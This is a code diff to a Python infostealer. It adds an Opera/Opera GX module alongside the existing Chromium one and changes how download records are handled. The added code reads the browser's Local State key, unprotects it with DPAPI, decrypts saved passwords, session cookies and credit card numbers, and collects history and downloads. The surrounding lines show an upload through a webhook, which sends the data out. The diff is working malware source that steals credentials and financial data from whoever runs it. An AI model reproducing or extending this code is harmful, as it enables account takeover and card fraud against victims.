@@ -21,6 +21,7 @@ class Browsers:
         self.webhook = SyncWebhook.from_url(webhook)
 
         Chromium()
+        Opera()
         Upload(self.webhook)
 
 class Upload:
@@ -92,7 +93,7 @@ class Upload:
                 yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
 
 class Chromium:
-    def __init__(self):
+    def __init__(self): 
         self.appdata = os.getenv('LOCALAPPDATA')
         self.browsers = {
             'amigo': self.appdata + '\\Amigo\\User Data',
@@ -228,12 +229,12 @@ class Chromium:
         shutil.copy(downloads_db, 'downloads_db')
         conn = sqlite3.connect('downloads_db')
         cursor = conn.cursor()
-        cursor.execute('SELECT site_url, tab_url, target_path, last_access_time  FROM downloads')
+        cursor.execute('SELECT tab_url, target_path FROM downloads')
         for row in cursor.fetchall():
-            if not row[0] or not row[1] or not row[2] or not row[3]:
+            if not row[0] or not row[1]:
                 continue
 
-            __DOWNLOADS__.append(Types.Download(row[0], row[1], row[2], row[3]))
+            __DOWNLOADS__.append(Types.Download(row[0], row[1]))
 
         conn.close()
         os.remove('downloads_db')
@@ -254,6 +255,152 @@ class Chromium:
             card_number = self.decrypt_password(row[3], self.master_key)
             __CARDS__.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))
 
+        conn.close()
+        os.remove('cards_db')
+
+class Opera:
+    def __init__(self) -> None:
+        self.roaming = os.getenv("APPDATA")
+        self.paths = {
+            'operagx': self.roaming + '\\Opera Software\\Opera GX Stable',
+            'opera': self.roaming + '\\Opera Software\\Opera Stable'
+        }
+
+        for _, path, in self.paths.items():
+            if not os.path.exists(path):
+                continue
+
+            self.master_key = self.get_master_key(f'{path}\\Local State')
+
+            operations = [
+                self.get_login_data,
+                self.get_cookies,
+                self.get_web_history,
+                self.get_downloads,
+                self.get_credit_cards
+            ]
+
+            for operation in operations:
+                operation(path)
+            
+
+    def get_master_key(self, path: str) -> str:
+        with open(path, "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+
+    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+
+        return decrypted_pass
+
+    def get_login_data(self, path: str) -> None:
+        login_db = f'{path}\\Login Data'
+        if not os.path.exists(login_db):
+            return
+
+        shutil.copy(login_db, 'login_db')
+        conn = sqlite3.connect('login_db')
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2]:
+                continue
+                
+            password = self.decrypt_password(row[2], self.master_key)
+            __LOGINS__.append(Types.Login(row[0], row[1], password))
+
+        cursor.close()
+        conn.close()
+        os.remove('login_db')
+
+    def get_cookies(self, path: str) -> None:
+        cookies_db = f'{path}\\Network\\Cookies'
+        if not os.path.exists(cookies_db):
+            return
+
+        shutil.copy(cookies_db, 'cookies_db')
+        conn = sqlite3.connect('cookies_db')
+        conn.text_factory = bytes
+        cursor = conn.cursor()
+        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
+                
+            cookie = self.decrypt_password(row[3], self.master_key)
+
+            row = [x.decode('latin-1') if isinstance(x, bytes) else x for x in row]
+            __COOKIES__.append(Types.Cookie(row[0], row[1], row[2], cookie, row[4]))
+
+        cursor.close()
+        conn.close()
+        os.remove('cookies_db')
+
+    def get_web_history(self, path: str) -> None:
+        history_db = f'{path}\\History'
+        if not os.path.exists(history_db):
+            return
+
+        shutil.copy(history_db, 'history_db')
+        conn = sqlite3.connect('history_db')
+        cursor = conn.cursor()
+        cursor.execute("SELECT url, title, last_visit_time FROM urls")
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2]:
+                continue
+                
+            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))
+
+        cursor.close()
+        conn.close()
+        os.remove('history_db')
+
+    def get_downloads(self, path: str) -> None:
+        downloads_db = f'{path}\\History'
+        if not os.path.exists(downloads_db):
+            return
+
+        shutil.copy(downloads_db, 'downloads_db')
+        conn = sqlite3.connect('downloads_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT tab_url, target_path FROM downloads')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
+
+            __DOWNLOADS__.append(Types.Download(row[0], row[1]))
+
+        cursor.close()
+        conn.close()
+        os.remove('downloads_db')
+
+    def get_credit_cards(self, path: str) -> None:
+        cards_db = f'{path}\\Web Data'
+        if not os.path.exists(cards_db):
+            return
+
+        shutil.copy(cards_db, 'cards_db')
+        conn = sqlite3.connect('cards_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
+                continue
+
+            card_number = self.decrypt_password(row[3], self.master_key)
+            __CARDS__.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))
+
+        cursor.close()
         conn.close()
         os.remove('cards_db')
 
@@ -297,14 +444,12 @@ class Types:
             return self.__str__()
 
     class Download:
-        def __init__(self, site_url, tab_url, target_path, last_access_time):
-            self.site_url = site_url
+        def __init__(self, tab_url, target_path):
             self.tab_url = tab_url
             self.target_path = target_path
-            self.last_access_time = last_access_time
 
         def __str__(self):
-            return f'{self.site_url}\t{self.tab_url}\t{self.target_path}\t{self.last_access_time}'
+            return f'{self.tab_url}\t{self.target_path}'
 
         def __repr__(self):
             return self.__str__()
